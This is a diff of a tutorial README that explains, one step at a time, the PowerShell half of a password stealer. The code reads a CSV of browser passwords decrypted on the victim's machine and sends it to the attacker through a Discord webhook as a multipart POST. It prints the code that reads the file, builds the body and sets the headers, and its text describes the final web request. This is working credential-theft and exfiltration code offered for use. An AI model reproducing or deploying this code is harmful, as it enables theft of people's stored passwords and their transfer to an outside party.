@@ -61,19 +61,30 @@ Now we run the python script using this line. The ```&``` tells powershell to ex
 
 ### Sending the passwords over Discord
 
-This part of the code is what takes the decrypted passwords file and sends it to you over discord. I am not going to explain how this works as i am not good in powershell scripting and shamelessly stole this part of stackoverflow and chatGPT XD.
+This part of the code is what takes the decrypted passwords file and sends it to you over discord.
+
+First we define the user thats logged into the computer, this will be used to acces folders like ```C:\Users\User\Documents\```
 ```powershell
-
 $user = $env:USERNAME
-
+```
+Then we use the now defined &user variable to define where the file ```decrypted_password.csv``` file is stored, this file contains the passwords that the python script previosly extracted.
+```powershell
 $file = "C:\Users\$user\Documents\decrypted_password.csv"
-
+```
+This variable plains and simple tells discord what message to deliver the file with
+```powershell
 $message = "Extracted passwords:"
-
+```
+This line of code is used to generate a unique identifier for the message each time the script is ran
+```powershell
 $boundary = [System.Guid]::NewGuid().ToString()
-
+```
+Here we read the ```decrypted_password.csv``` file from the previously defined ```$file``` variable and saves it into a variable called ```$fileContent```
+```powershell
 $fileContent = [System.IO.File]::ReadAllBytes($file)
-
+```
+This code takes all of the now gathered information and puts it into an array called ```$bodyLines``` that is joined to one string in a variable called ```body```
+```powershell
 $bodyLines = @(
     "--$boundary",
     "Content-Disposition: form-data; name=`"content`"",
@@ -88,10 +99,11 @@ $bodyLines = @(
 )
 
 $body = $bodyLines -join "`r`n"
-
+```
+After that is gathered we have to define the http headers for the webhook, we set the header to ```multipart/form-data``` so it know that we are sending a file. Then we give the request or unique identifier with the variable ```$boundary``` that we generated earlier.
+```powershell
 $headers = @{
     "Content-Type" = "multipart/form-data; boundary=$boundary"
 }
-
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
 ```
+Last but not least we invoke a web request to our webhook with all of our information. This includes setting the request to POST, including the headers and the body.
